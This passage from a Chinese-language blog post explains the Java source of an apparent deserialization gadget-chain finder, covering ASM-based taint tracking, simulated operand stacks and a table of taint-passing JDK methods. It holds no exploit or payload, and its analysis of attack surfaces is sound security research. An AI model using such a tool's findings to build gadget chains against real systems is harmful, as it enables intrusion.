class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitMethodInsn</span><span class="params">(<span class="type">int</span> opcode, String owner, String name, String desc, <span class="type">boolean</span> itf)</span> &#123;  <span class="comment">// 访问方法指令，方法指令是调用方法的指令。</span></span><br><span class="line">    <span class="comment">// 根据描述符得出被调用方法的参数类型（占用空间大小）</span></span><br><span class="line">    Type[] argTypes = Type.getArgumentTypes(desc);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 非静态方法的第一个参数是对象本身，即 this</span></span><br><span class="line">    <span class="keyword">if</span> (opcode != Opcodes.INVOKESTATIC) &#123;</span><br><span class="line">        Type[] extendedArgTypes = <span class="keyword">new</span> <span class="title class_">Type</span>[argTypes.length + <span class="number">1</span>];</span><br><span class="line">        System.arraycopy(argTypes, <span class="number">0</span>, extendedArgTypes, <span class="number">1</span>, argTypes.length);</span><br><span class="line">        extendedArgTypes[<span class="number">0</span>] = Type.getObjectType(owner);    <span class="comment">// 对象类型</span></span><br><span class="line">        argTypes = extendedArgTypes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据描述符获取被调用方法的返回值类型大小</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">retSize</span> <span class="operator">=</span> Type.getReturnType(desc).getSize();</span><br><span class="line">    <span class="comment">// 能够传递污染的参数索引集合</span></span><br><span class="line">    Set&lt;Integer&gt; resultTaint;</span><br><span class="line">    <span class="keyword">switch</span> (opcode) &#123;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.INVOKESTATIC:      <span class="comment">// 调用静态方法</span></span><br><span class="line">        <span class="keyword">case</span> Opcodes.INVOKEVIRTUAL:     <span class="comment">// 调用实例方法</span></span><br><span class="line">        <span class="keyword">case</span> Opcodes.INVOKESPECIAL:     <span class="comment">// 调用超类构造方法，实例初始化方法，私有方法</span></span><br><span class="line">        <span class="keyword">case</span> Opcodes.INVOKEINTERFACE:   <span class="comment">// 调用接口方法</span></span><br><span class="line">            <span class="comment">// 模拟操作数栈</span></span><br><span class="line">            <span class="keyword">final</span> List&lt;Set&lt;Integer&gt;&gt; argTaint = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Set&lt;Integer&gt;&gt;(argTypes.length);</span><br><span class="line">            <span class="comment">// 调用方法前先把操作数入栈</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; argTypes.length; i++) &#123;</span><br><span class="line">                argTaint.add(<span class="literal">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 记录数据起始位置</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">stackIndex</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; argTypes.length; i++) &#123;</span><br><span class="line">                <span class="type">Type</span> <span class="variable">argType</span> <span class="operator">=</span> argTypes[i];</span><br><span class="line">                <span class="keyword">if</span> (argType.getSize() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="comment">// 根据参数类型的大小，调用 TaintTrackingMethodVisitor.getStackTaint 读取栈中的值</span></span><br><span class="line">                    <span class="comment">// 参数从右往左入栈，这里将参数值拷贝到 argTaint</span></span><br><span class="line">                    argTaint.set(argTypes.length - <span class="number">1</span> - i, getStackTaint(stackIndex + argType.getSize() - <span class="number">1</span>));</span><br><span class="line">                &#125;</span><br><span class="line">                stackIndex += argType.getSize();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 如果被调用的是构造方法，则认为被调用方法所属类的实例对象本身可以传递污染</span></span><br><span class="line">            <span class="keyword">if</span> (name.equals(<span class="string">&quot;&lt;init&gt;&quot;</span>)) &#123;</span><br><span class="line">                <span class="comment">// Pass result taint through to original taint set; the initialized object is directly tainted by</span></span><br><span class="line">                <span class="comment">// parameters</span></span><br><span class="line">                resultTaint = argTaint.get(<span class="number">0</span>);  <span class="comment">// 从栈顶取出对象，实际上是该对象的参数索引集合</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                resultTaint = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();  <span class="comment">// 否则初始化为空</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 经过逆拓扑排序，调用链末端的方法先被访问和判断，即被调用方法已经被判断过</span></span><br><span class="line">            <span class="comment">// 例如 A-&gt;B，判断 A 时 B 已经有判断结果了，并且此时栈中的数据是这样：B对象 B参数</span></span><br><span class="line">            Set&lt;Integer&gt; passthrough = passthroughDataflow.get(<span class="keyword">new</span> <span class="title class_">MethodReference</span>.Handle(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(owner), name, desc));</span><br><span class="line">            <span class="comment">// 如果被调用方法存在能够传递污染的参数</span></span><br><span class="line">            <span class="keyword">if</span> (passthrough != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// 遍历参数索引</span></span><br><span class="line">                <span class="keyword">for</span> (Integer passthroughDataflowArg : passthrough) &#123;</span><br><span class="line">                    <span class="comment">// 从栈中获取能够传递污染的参数索引集合，全部添加到 resultTaint</span></span><br><span class="line">                    resultTaint.addAll(argTaint.get(passthroughDataflowArg));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Unsupported opcode: &quot;</span> + opcode);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用 TaintTrackingMethodVisitor.visitMethodInsn 执行出/入栈操作，根据预定义的判断规则分析参数索引集合</span></span><br><span class="line">    <span class="built_in">super</span>.visitMethodInsn(opcode, owner, name, desc, itf);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回值不为空</span></span><br><span class="line">    <span class="comment">// 实例对象本身有可能传递污染，因此不能直接根据返回值判断（即不能最先执行这一块）</span></span><br><span class="line">    <span class="keyword">if</span> (retSize &gt; <span class="number">0</span>) &#123;  <span class="comment">// 1 或者 2</span></span><br><span class="line">        <span class="comment">// 调用 TaintTrackingMethodVisitor.getStackTaint 将 resultTaint 中的元素合并到参数索引集合中</span></span><br><span class="line">        <span class="comment">// 这里减 1 是因为在 TaintTrackingMethodVisitor.visitMethodInsn 中已经将第一个单位的值设置为其分析得到的参数索引集合</span></span><br><span class="line">        getStackTaint(retSize - <span class="number">1</span>).addAll(resultTaint);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>save</code> 方法和 <code>load</code> 方法使用工厂方法实现数据的存取。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 使用工厂方法存储存储数据流信息</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">save</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">if</span> (passthroughDataflow == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Save called before discover()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    DataLoader.saveData(Paths.get(<span class="string">&quot;passthrough.dat&quot;</span>), <span class="keyword">new</span> <span class="title class_">PassThroughFactory</span>(), passthroughDataflow.entrySet());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 从 passthrough.dat 加载数据流信息</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; load() <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; passthroughDataflow = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; entry : DataLoader.loadData(Paths.get(<span class="string">&quot;passthrough.dat&quot;</span>), <span class="keyword">new</span> <span class="title class_">PassThroughFactory</span>())) &#123;</span><br><span class="line">        passthroughDataflow.put(entry.getKey(), entry.getValue());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> passthroughDataflow;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 数据工厂接口实现</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">PassThroughFactory</span> <span class="keyword">implements</span> <span class="title class_">DataFactory</span>&lt;Map.Entry&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt;&gt; &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Map.Entry&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; parse(String[] fields) &#123;</span><br><span class="line">        ClassReference.<span class="type">Handle</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(fields[<span class="number">0</span>]);</span><br><span class="line">        MethodReference.<span class="type">Handle</span> <span class="variable">method</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MethodReference</span>.Handle(clazz, fields[<span class="number">1</span>], fields[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">        Set&lt;Integer&gt; passthroughArgs = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (String arg : fields[<span class="number">3</span>].split(<span class="string">&quot;,&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (arg.length() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                passthroughArgs.add(Integer.parseInt(arg));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">AbstractMap</span>.SimpleEntry&lt;&gt;(method, passthroughArgs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String[] serialize(Map.Entry&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; entry) &#123;</span><br><span class="line">        <span class="keyword">if</span> (entry.getValue().size() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> String[] fields = <span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">4</span>];</span><br><span class="line">        fields[<span class="number">0</span>] = entry.getKey().getClassReference().getName();   <span class="comment">// 方法所属类的类名</span></span><br><span class="line">        fields[<span class="number">1</span>] = entry.getKey().getName();   <span class="comment">// 方法的名称</span></span><br><span class="line">        fields[<span class="number">2</span>] = entry.getKey().getDesc();   <span class="comment">// 方法的描述符</span></span><br><span class="line"></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (Integer arg : entry.getValue()) &#123;</span><br><span class="line">            sb.append(Integer.toString(arg));</span><br><span class="line">            sb.append(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        fields[<span class="number">3</span>] = sb.toString();  <span class="comment">// 参数索引</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> fields;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6-TaintTrackingMethodVisitor"><a href="#6-TaintTrackingMethodVisitor" class="headerlink" title="6. TaintTrackingMethodVisitor"></a>6. TaintTrackingMethodVisitor</h2><p>继承 asm 的 MethodVisitor，模拟 JVM 内存结构，即本地变量表 <code>localVars</code> 和操作数栈 <code>stackVars</code>；重写了大量方法模拟调用参数时的出&#x2F;入栈操作，用于进行污点分析。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SavedVariableState</span>&lt;T&gt; &#123;</span><br><span class="line">    List&lt;Set&lt;T&gt;&gt; localVars; <span class="comment">// 本地变量表</span></span><br><span class="line">    List&lt;Set&lt;T&gt;&gt; stackVars; <span class="comment">// 操作数栈</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SavedVariableState</span><span class="params">()</span> &#123;</span><br><span class="line">        localVars = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        stackVars = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SavedVariableState</span><span class="params">(SavedVariableState&lt;T&gt; copy)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.localVars = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(copy.localVars.size());</span><br><span class="line">        <span class="built_in">this</span>.stackVars = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(copy.stackVars.size());</span><br><span class="line">        <span class="keyword">for</span> (Set&lt;T&gt; original : copy.localVars) &#123;</span><br><span class="line">            <span class="built_in">this</span>.localVars.add(<span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;(original));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (Set&lt;T&gt; original : copy.stackVars) &#123;</span><br><span class="line">            <span class="built_in">this</span>.stackVars.add(<span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;(original));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">combine</span><span class="params">(SavedVariableState&lt;T&gt; copy)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; copy.localVars.size(); i++) &#123;</span><br><span class="line">            <span class="keyword">while</span> (i &gt;= <span class="built_in">this</span>.localVars.size()) &#123;</span><br><span class="line">                <span class="built_in">this</span>.localVars.add(<span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;T&gt;());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">this</span>.localVars.get(i).addAll(copy.localVars.get(i));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; copy.stackVars.size(); i++) &#123;</span><br><span class="line">            <span class="keyword">while</span> (i &gt;= <span class="built_in">this</span>.stackVars.size()) &#123;</span><br><span class="line">                <span class="built_in">this</span>.stackVars.add(<span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;T&gt;());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">this</span>.stackVars.get(i).addAll(copy.stackVars.get(i));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>预定义了一些数据流信息：类名，方法名，方法描述符，传递污染的参数索引。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Object[][] PASSTHROUGH_DATAFLOW = <span class="keyword">new</span> <span class="title class_">Object</span>[][]&#123;</span><br><span class="line">        &#123;<span class="string">&quot;java/lang/Object&quot;</span>, <span class="string">&quot;toString&quot;</span>, <span class="string">&quot;()Ljava/lang/String;&quot;</span>, <span class="number">0</span>&#125;,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Taint from ObjectInputStream. Note that defaultReadObject() is handled differently below</span></span><br><span class="line">        &#123;<span class="string">&quot;java/io/ObjectInputStream&quot;</span>, <span class="string">&quot;readObject&quot;</span>, <span class="string">&quot;()Ljava/lang/Object;&quot;</span>, <span class="number">0</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/io/ObjectInputStream&quot;</span>, <span class="string">&quot;readFields&quot;</span>, <span class="string">&quot;()Ljava/io/ObjectInputStream$GetField;&quot;</span>, <span class="number">0</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/io/ObjectInputStream$GetField&quot;</span>, <span class="string">&quot;get&quot;</span>, <span class="string">&quot;(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;&quot;</span>, <span class="number">0</span>&#125;,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Pass taint from class name to returned class</span></span><br><span class="line">        &#123;<span class="string">&quot;java/lang/Object&quot;</span>, <span class="string">&quot;getClass&quot;</span>, <span class="string">&quot;()Ljava/lang/Class;&quot;</span>, <span class="number">0</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/lang/Class&quot;</span>, <span class="string">&quot;forName&quot;</span>, <span class="string">&quot;(Ljava/lang/String;)Ljava/lang/Class;&quot;</span>, <span class="number">0</span>&#125;,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Pass taint from class or method name to returned method</span></span><br><span class="line">        &#123;<span class="string">&quot;java/lang/Class&quot;</span>, <span class="string">&quot;getMethod&quot;</span>, <span class="string">&quot;(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;&quot;</span>, <span class="number">0</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        <span class="comment">// Pass taint from class to methods</span></span><br><span class="line">        &#123;<span class="string">&quot;java/lang/Class&quot;</span>, <span class="string">&quot;getMethods&quot;</span>, <span class="string">&quot;()[Ljava/lang/reflect/Method;&quot;</span>, <span class="number">0</span>&#125;,</span><br><span class="line"></span><br><span class="line">        &#123;<span class="string">&quot;java/lang/StringBuilder&quot;</span>, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;(Ljava/lang/String;)V&quot;</span>, <span class="number">0</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/lang/StringBuilder&quot;</span>, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;(Ljava/lang/CharSequence;)V&quot;</span>, <span class="number">0</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/lang/StringBuilder&quot;</span>, <span class="string">&quot;append&quot;</span>, <span class="string">&quot;(Ljava/lang/Object;)Ljava/lang/StringBuilder;&quot;</span>, <span class="number">0</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/lang/StringBuilder&quot;</span>, <span class="string">&quot;append&quot;</span>, <span class="string">&quot;(Ljava/lang/String;)Ljava/lang/StringBuilder;&quot;</span>, <span class="number">0</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/lang/StringBuilder&quot;</span>, <span class="string">&quot;append&quot;</span>, <span class="string">&quot;(Ljava/lang/StringBuffer;)Ljava/lang/StringBuilder;&quot;</span>, <span class="number">0</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/lang/StringBuilder&quot;</span>, <span class="string">&quot;append&quot;</span>, <span class="string">&quot;(Ljava/lang/CharSequence;)Ljava/lang/StringBuilder;&quot;</span>, <span class="number">0</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/lang/StringBuilder&quot;</span>, <span class="string">&quot;append&quot;</span>, <span class="string">&quot;(Ljava/lang/CharSequence;II)Ljava/lang/StringBuilder;&quot;</span>, <span class="number">0</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/lang/StringBuilder&quot;</span>, <span class="string">&quot;toString&quot;</span>, <span class="string">&quot;()Ljava/lang/String;&quot;</span>, <span class="number">0</span>&#125;,</span><br><span class="line"></span><br><span class="line">        &#123;<span class="string">&quot;java/io/ByteArrayInputStream&quot;</span>, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;([B)V&quot;</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/io/ByteArrayInputStream&quot;</span>, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;([BII)V&quot;</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/io/ObjectInputStream&quot;</span>, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;(Ljava/io/InputStream;)V&quot;</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/io/File&quot;</span>, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;(Ljava/lang/String;I)V&quot;</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/io/File&quot;</span>, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;(Ljava/lang/String;Ljava/io/File;)V&quot;</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/io/File&quot;</span>, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;(Ljava/lang/String;)V&quot;</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/io/File&quot;</span>, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;(Ljava/lang/String;Ljava/lang/String;)V&quot;</span>, <span class="number">1</span>&#125;,</span><br><span class="line"></span><br><span class="line">        &#123;<span class="string">&quot;java/nio/paths/Paths&quot;</span>, <span class="string">&quot;get&quot;</span>, <span class="string">&quot;(Ljava/lang/String;[Ljava/lang/String;)Ljava/nio/file/Path;&quot;</span>, <span class="number">0</span>&#125;,</span><br><span class="line"></span><br><span class="line">        &#123;<span class="string">&quot;java/net/URL&quot;</span>, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;(Ljava/lang/String;)V&quot;</span>, <span class="number">1</span>&#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>问题：这里实现的 <code>visitMethodInsn</code> 比 PassthroughDataflowMethodVisitor.visitMethodInsn 多三个判断规则，后面 CallGraphDiscovery 中的 ModelGeneratorMethodVisitor 也重写了该方法并在最后调用该父类方法，为什么不直接剥离出来？</p><ul><li>PassthroughDataflowMethodVisitor 中存储的是参数索引，而 ModelGeneratorMethodVisitor 中存储的是 <code>arg参数索引.字段名称</code></li><li>出入栈操作都在 TaintTrackingMethodVisitor 中实现</li><li>经过该方法的模拟，栈顶元素即该方法能够传递污染的参数索引集合</li></ul><p>举个例子看一看字节码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">A</span>().method1(args[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getValue</span><span class="params">(Integer number)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;100&quot;</span>;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">n</span> <span class="operator">=</span> Integer.parseInt(s);</span><br><span class="line"></span><br><span class="line">        n = number;</span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> n.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">method1</span><span class="params">(String param)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> param;</span><br><span class="line">    &#125;</span><br><span 